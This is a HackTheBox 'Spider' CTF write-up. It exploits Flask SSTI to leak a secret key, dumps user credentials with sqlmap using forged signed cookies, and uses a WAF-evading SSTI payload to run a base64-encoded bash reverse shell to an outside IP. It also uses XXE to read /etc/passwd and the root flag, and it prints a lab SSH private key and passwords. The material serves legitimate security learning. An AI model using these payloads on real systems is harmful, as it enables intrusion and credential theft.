---
title: HTB Spider writeup
description: writeup of Spider box from Hackthebox
image: https://0xdedinfosec.github.io/hackthebox/spider/spider.png
authors: ["shivam"]
slug: spider
tags: ["SSTI", "flask", "flask-unsign", "sqlmap", "xml"]
---

Hello everyone,

Today we are going to solve the spider machine from Hackthebox. we will learn about SSTI in flask,flask-unsign with cookies,dumping data with sqlmap and XML entity injection

![](https://0xdedinfosec.github.io/hackthebox/spider/spider.png)

<!--truncate-->

## Nmap results

```c
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://spider.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

--> It's redirecting us to `spider.htb` so Let's add it in `/etc/hosts`

--> Got this website on port `80`

![](Attachments/Pastedimage20211107063106.png)

---

## Gobuster results

```c
===============================================================
/cart                 (Status: 500) [Size: 290]
/checkout             (Status: 500) [Size: 290]
/index                (Status: 500) [Size: 290]
/login                (Status: 200) [Size: 1832]
/logout               (Status: 302) [Size: 209] [--> http://spider.htb/]
/main                 (Status: 500) [Size: 290]
/product-details      (Status: 308) [Size: 275] [--> http://spider.htb/product-details/]
/register             (Status: 200) [Size: 2130]
/user                 (Status: 302) [Size: 219] [--> http://spider.htb/login]
/view                 (Status: 302) [Size: 219] [--> http://spider.htb/login]
===============================================================
2021/11/05 13:30:13 Finished
===============================================================
```

---

## Enumration

--> I tried to register with the username and password and then logged in . After that i saw that we can see the user info in `user information` tab and it's assigning unique `UUID` for each user.

--> I tried the basic SSTI payload `{{config}}` and registered with this name and found that we can see the config files.

==> Note: Name must be smaller than 10 characters.

```
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'RATELIMIT_ENABLED': True, 'RATELIMIT_DEFAULTS_PER_METHOD': False, 'RATELIMIT_SWALLOW_ERRORS': False, 'RATELIMIT_HEADERS_ENABLED': False, 'RATELIMIT_STORAGE_URL': 'memory://', 'RATELIMIT_STRATEGY': 'fixed-window', 'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset', 'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining', 'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit', 'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After', 'UPLOAD_FOLDER': 'static/uploads'}>
```

--> I found the secret key in this file :

```bash
Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942
```

--> After searching for the variables like `SESSION_COOKIE_SAMESITE`, `PERMANENT_SESSION_LIFETIME`,`RATELIMIT_HEADERS_ENABLED` i found that this website is using `flask` in backend.

![](Attachments/Pastedimage20211107064501.png)

--> Cookies :

```
eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6ImNlNGQzYmI5LWIyZTktNDQwZi1iZWQ0LWRhMDliY2I5MzlmNiJ9.YYe9Ig.Vk7ey7efv0ElIaByDhNcfndwkWY
```

After decoding :

```json
{ "cart_items": [], "uuid": "ce4d3bb9-b2e9-440f-bed4-da09bcb939f6" }
```

--> Let's add something in cart and see the changes in the cookies

```json
{ "cart_items": ["1"], "uuid": "ce4d3bb9-b2e9-440f-bed4-da09bcb939f6" }
```

So it's changing the cookies on interaction with cart

## sqlmap

--> I found [this](https://book.hacktricks.xyz/pentesting/pentesting-web/flask) Blog but `flask-unsign` is not working in my system so i will continue with `sqlmap` command which you can find [here](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval)

```
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```

Let's modify it

```
sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --dump
```

--> After running the sqlmap i got these results :

```bash
Parameter: Cookie #1* ((custom) HEADER)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=' AND (SELECT 5244 FROM (SELECT(SLEEP(5)))JJSC) AND 'oNCX'='oNCX

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: session=' UNION ALL SELECT CONCAT(0x716b766b71,0x67664d595359566c6672695942626f6852685967434b53624f6b46744d654868624357724f477069,0x7162706a71)-- -
---

Database: shop
Table: users
[5 entries]
+----+--------------------------------------+------------+-----------------+
| id | uuid                                 | name       | password        |
+----+--------------------------------------+------------+-----------------+
| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |
| 2  | ce4d3bb9-b2e9-440f-bed4-da09bcb939f6 | {{config}} | hacker          |
| 3  | 0ef61829-d721-4fb7-b77d-1c822759b859 | hack       | hacker          |
| 4  | 8188a43e-e335-4904-b7e8-14adb9a746c7 | hecker     | hecker          |
| 5  | b5826318-5d52-48a8-981b-5d54baf52896 | {{config}} | {{config}}      |
+----+--------------------------------------+------------+-----------------+

Database: shop
Table: messages
[1 entry]
+---------+---------+-----------------------------------------------------------------------------------+---------------------+
| post_id | creator | message                                                                           | timestamp           |
+---------+---------+-----------------------------------------------------------------------------------+---------------------+
| 1       | 1       | Fix the <b>/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</b> portal! | 2020-04-24 15:02:41 |
+---------+---------+-----------------------------------------------------------------------------------+---------------------+
```

## flask reverse shell

--> We got the password of `chiv` so Let's try to login as SSH

But it didn't worked :/

--> So then i tried to login with `UUID` and password on website and i got the admin panel.

![](Attachments/Pastedimage20211107075253.png)

--> There is a one message in messages

```bash
Fix the /a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal portal!
```

So it might be some directory so let's go into this

and it is generating the support ticket

![](Attachments/Pastedimage20211107075443.png)

--> Then i tried to add `{{config}}` but WAF is filtering that so we have to find some payload which bypasses the WAF and i found one [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')("id")|attr('read')()}}
```

--> But i found that it's filtering the single quote `'` also so let's try with double quote `"`

New payload :

```bash
{% include request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("sleep 5")|attr("read")()%}
```

#### Why we used include and % ?

get your answer [here](https://pythonprogramming.net/flask-includes-tutorial/)

--> And we got 5 seconds sleep !

--> So let's get the reverse shell using this payload .

But we need to `base64 encode` the reverse shell because it's not working directly because of special characters

So now our payload looks like this

```bash
{% include request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjIvNjk2OSAwPiYxCg== | base64 -d | bash
")|attr("read")()%}
```

--> we need to url encode this also

--> And i got the reverse shell and `user` flag

I also got the ssh key for chiv

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV
gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS
U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9
MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7
BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2
VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu
6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs
hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl
Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc
XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq
54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy
f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62
nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL
j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO
JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW
K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv
hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ
mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8
gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb
0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2
nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W
CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG
rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO
TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6
IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==
-----END RSA PRIVATE KEY-----
```

--> And i also found that there is a port `8080` running internally and i found it using `netstat -anp` command

![](Attachments/Pastedimage20211107104452.png)

--> So let's forward this port and let's see what we get !

## XML entity injection

And i found this beta login page

![](Attachments/Pastedimage20211108120028.png)

so Let's login as `admin` user witout giving password

--> and we got logged in !

![](Attachments/Pastedimage20211108120130.png)

--> After some searching i found this cookies which looks weird

```
.eJxNjEFvgyAARv_KwnkH7WqTmexiAG03cKCActPRBC1as5HU2fS_z16aHb-8770rcPPgQHwFTy2IgUAUGzSX7HSQXPlRDqE6KvLbZrprBN6W6ZQYEUJWcSIh_xDIvpthv4jCw5WPhaBJjqeM94m-8_vWgYNMmQML0FZjm7cp9VTZTobiW0lTmBRXFFpCQr1Tbu1JVxE1M715Hf_7PLOXekFRs_ZJlXRNz18EItFXSuZc2YYv-FIP56B4_M1GnUxKsBMUecYWF9X9PiI4GT_L4A3cnsF07kb_A-Lg9gfxF1a8.YYlYJQ.cq3IvEiTsuVC9kD_QCCpldA_qHQ
```

--> Let's decode it with `flask-unsign`

```bash
flask-unsign --deocde --cookie <cookie>
```

--> After decoding it i got this :

```
{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+YWRtaW48L3VzZXJuYW1lPgogICAgICAgIDxpc19hZG1pbj4wPC9pc19hZG1pbj4KICAgIDwvZGF0YT4KPC9yb290Pg==', 'points': 0}
```

--> Let's decode value of `lxml` which looks `base64` because of `=` at the end

--> and we have `XML` data !

![](Attachments/Pastedimage20211108121618.png)

--> So let's try `xml entity injection` payloads after intercepting the request

i found this payload :

```bash
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

--> But for that we have to login as `&admin;` because the payload requires it

#### but wait where we will inject this payload ?

--> So for that let's intercept the login request

and this is what i got :

```bash
POST /login HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://localhost:8000
Connection: close
Referer: http://localhost:8000/login
Cookie: __test=1; session=eyJwb2ludHMiOjB9.YYldfw.MlhlWFVe5ZLZX9fJ1u3Kr3CV5cI
Upgrade-Insecure-Requests: 1

username=%26admin%3B&version=1.0.0
```

--> Here there are 2 parameters `username` and `version` and i found that `version` is reflecting in first tags in `xml` and `username` is reflecting between `<username></username>` so we have to inject the payload in `version` because `<!DOCTYPE>` must be at first tag

so my payload is looking like this :

```bash
value=1.0.2--><!DOCTYPE root [<!ENTITY admin SYSTEM 'file:///etc/passwd'>]><!--
```

so now `xml` look like this :

```bash
<!API version 1.0.2--><!DOCTYPE root [<!ENTITY admin SYSTEM 'file:///etc/passwd'>]><!---->
#and other stuff after this
```

--> and boom we got content of `/etc/passwd` !

![](Attachments/Pastedimage20211108123051.png)

--> So now let's read the flag which is in `/root/root.txt`

--> and boom we got the root flag !

![](Attachments/Pastedimage20211108123443.png)

```bash
c208888f258c21bfdf59c8d4099fd3a1
```

--> If you need better shell then just grab the `id_rsa` and get the ssh shell

![](Attachments/Pastedimage20211108124059.png)

---

## Resources

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
